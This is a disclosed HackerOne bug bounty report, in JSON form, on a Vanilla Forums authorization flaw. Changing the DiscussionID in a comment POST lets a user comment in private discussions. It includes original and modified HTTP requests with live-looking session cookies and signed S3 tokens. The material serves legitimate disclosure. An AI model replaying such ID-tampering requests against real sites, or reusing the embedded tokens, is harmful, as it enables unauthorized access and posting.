{"id":321725,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjE3MjU=","url":"https://hackerone.com/reports/321725","title":"A user can comment in private discussions without having permission to access the discussion","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-03-04T05:31:24.974Z","submitted_at":"2018-03-04T05:31:24.974Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"samux","url":"/samux","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/RFFNZ7j1iW2EJUZueag8jPHF/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17443,"url":"https://hackerone.com/vanilla","handle":"vanilla","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Vanilla","twitter_handle":"vanilla","website":"http://vanillaforums.com","about":"Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-06-22T02:00:20.691Z","bug_reporter_agreed_on_going_public_at":"2018-05-23T02:00:15.173Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello team,\n\n I have found a vulnerability which allows a user who does not have access to a discussion to comment on it and thus avoid the control applied. (http://littleguy.vanillastaging.com/)\n\nProof Of Concept\n=============\n\nFor this proof of concept I have used 3 users. User A creates a PRIVATE group and invites user B to join it. Subsequently, user A creates a private discussion.\n\nhttp://littleguy.vanillastaging.com/discussion/15/\n\nThis is the private discussion  between User A and User B, obviously you can't have access\n\n{F269044}\n\nNow user C tries to access this discussion however the following is observed\n\n{F269045}\n\nHowever, make a comment about any public discussion and you get the following request\n\nOriginal Request\n=============\n\n```\nPOST /post/comment/?discussionid=5 HTTP/1.1\nHost: littleguy.vanillastaging.com\nContent-Length: 193\nAccept: application/json, text/javascript, */*; q=0.01\nOrigin: http://littleguy.vanillastaging.com\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: http://littleguy.vanillastaging.com/discussion/5/here-is-a-test-post\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,es;q=0.8\nCookie: vf_littleguy_E5VIB=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjI3MzExNjksImlhdCI6MTUyMDEzOTE2OSwic3ViIjoxNn0.0TFpZFEd9ixdKXLyqvBMNLFz8-H_0lE5T-BKgLcKzbw; vf_littleguy_E5VIB-tk=MwuNaFoQKzhhjRH8%3A16%3A1520139169%3A8576a5cbf8fcff797e8bffc92094d999; __vnf=5a998c58d9794; ; vf_littleguy_E5VIB-Vv=1520141074\nConnection: close\n\nTransientKey=your_token_id\u0026hpt=\u0026DiscussionID=5\u0026CommentID=\u0026DraftID=\u0026Format=Wysiwyg\u0026Body=I'm+user+C%26nbsp%3B\u0026_wysihtml5_mode=1\u0026DeliveryType=VIEW\u0026DeliveryMethod=JSON\u0026Type=Post\u0026LastCommentID=17\n```\n\nNow the user modifies the DiscussionID variable that is in the URI and in the data of the POST by the ID of the private discussion (ID number 15)\n\nModified Request\n==============\n\n```\nPOST /post/comment/?discussionid=15 HTTP/1.1\nHost: littleguy.vanillastaging.com\nContent-Length: 194\nAccept: application/json, text/javascript, */*; q=0.01\nOrigin: http://littleguy.vanillastaging.com\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: http://littleguy.vanillastaging.com/discussion/5/here-is-a-test-post\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,es;q=0.8\nCookie: vf_littleguy_E5VIB=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjI3MzExNjksImlhdCI6MTUyMDEzOTE2OSwic3ViIjoxNn0.0TFpZFEd9ixdKXLyqvBMNLFz8-H_0lE5T-BKgLcKzbw; vf_littleguy_E5VIB-tk=MwuNaFoQKzhhjRH8%3A16%3A1520139169%3A8576a5cbf8fcff797e8bffc92094d999; __vnf=5a998c58d9794; ; vf_littleguy_E5VIB-Vv=1520141074\nConnection: close\n\nTransientKey=your_token_id\u0026hpt=\u0026DiscussionID=15\u0026CommentID=\u0026DraftID=\u0026Format=Wysiwyg\u0026Body=I'm+user+C%26nbsp%3B\u0026_wysihtml5_mode=1\u0026DeliveryType=VIEW\u0026DeliveryMethod=JSON\u0026Type=Post\u0026LastCommentID=17\n```\n\n{F269046}\n\nUser C has managed to comment on the private discussion\n\n\nThanks\n\n## Impact\n\nIt should be mentioned that here there is a problem at the ID level, all the discussions are generated with consecutive numeric IDs, this means that an attacker could list all the discussions (public and private) and comment on the private ones without authorization.","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":65,"name":"Business Logic Errors"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":269044,"file_name":"private_discussion.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/269/044/1713a5ee9726b8767a2f5391e55bfd03c6f739e8/private_discussion.png?response-content-disposition=attachment%3B%20filename%3D%22private_discussion.png%22%3B%20filename%2A%3DUTF-8%27%27private_discussion.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144524Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=67cea2c08375b198a5ecee7327209eb1d6e58d700fd4c9d2932ca9e0f2c14ca6","file_size":311291,"type":"image/png"},{"id":269045,"file_name":"userC_can't_view_this.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/269/045/f75f5bdce163ab2425e81174f63c8f4b7fa1ce98/userC_can%27t_view_this.png?response-content-disposition=attachment%3B%20filename%3D%22userC_can%2527t_view_this.png%22%3B%20filename%2A%3DUTF-8%27%27userC_can%2527t_view_this.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144524Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=76ee0ec436d3fbce64f3ec31cd6d3d0d482b98323b85babd8126c1fe1f37604f","file_size":154620,"type":"image/png"},{"id":269046,"file_name":"userC_comment_in_private_group.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/269/046/dd0f7e9aef1aa9cd129c4b39f750354f8fcb45da/userC_comment_in_private_group.png?response-content-disposition=attachment%3B%20filename%3D%22userC_comment_in_private_group.png%22%3B%20filename%2A%3DUTF-8%27%27userC_comment_in_private_group.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144524Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=54bc5a84b83d4d1f96a9277cf3b5f109085316c2f1f316119eaee63e1f64af48","file_size":237885,"type":"image/png"}],"allow_singular_disclosure_at":"2018-06-22T02:00:15.300Z","allow_singular_disclosure_after":-104330708.8703425,"singular_disclosure_allowed":true,"vote_count":23,"voters":["mashoud1122","muon4","sameerphad72","ali","ahiezer","eveeez","an0nym0us","apapedulimu","khizer47","ak1t4","and 13 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":2103,"asset_type":"URL","asset_identifier":"*.vanillastaging.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2461556,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi there, thank you for submitting this report. It has been triaged as a legitimate exploit and we will prepare a patch as soon as possible.","automated_response":false,"created_at":"2018-03-05T20:51:50.954Z","updated_at":"2018-03-05T20:51:50.954Z","actor":{"username":"dexterr","cleared":false,"url":"/dexterr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/201/11a7da9d5256f50a86acdf6a8f3366252baee73e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2500119,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-03-16T20:59:16.720Z","updated_at":"2018-03-16T20:59:16.720Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":124675,"new_severity_id":129568},"actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2500120,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-03-16T20:59:25.205Z","updated_at":"2018-03-16T20:59:25.205Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Vanilla"}},"bounty_amount":"150.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"vanilla","collaborator":{"username":"samux","url":"/samux"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2781960,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Closing this report as resolved.","automated_response":false,"created_at":"2018-05-23T01:46:49.361Z","updated_at":"2018-05-23T01:46:49.361Z","actor":{"username":"dexterr","cleared":false,"url":"/dexterr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/201/11a7da9d5256f50a86acdf6a8f3366252baee73e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"samux","url":"/samux"},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2781985,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"My friend @dexterr , Could we disclosure this please?","automated_response":false,"created_at":"2018-05-23T02:00:15.218Z","updated_at":"2018-05-23T02:00:15.218Z","first_to_agree":true,"actor":{"username":"samux","cleared":true,"url":"/samux","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RFFNZ7j1iW2EJUZueag8jPHF/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2919438,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-06-22T02:00:20.724Z","updated_at":"2018-06-22T02:00:20.724Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Vanilla"}},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}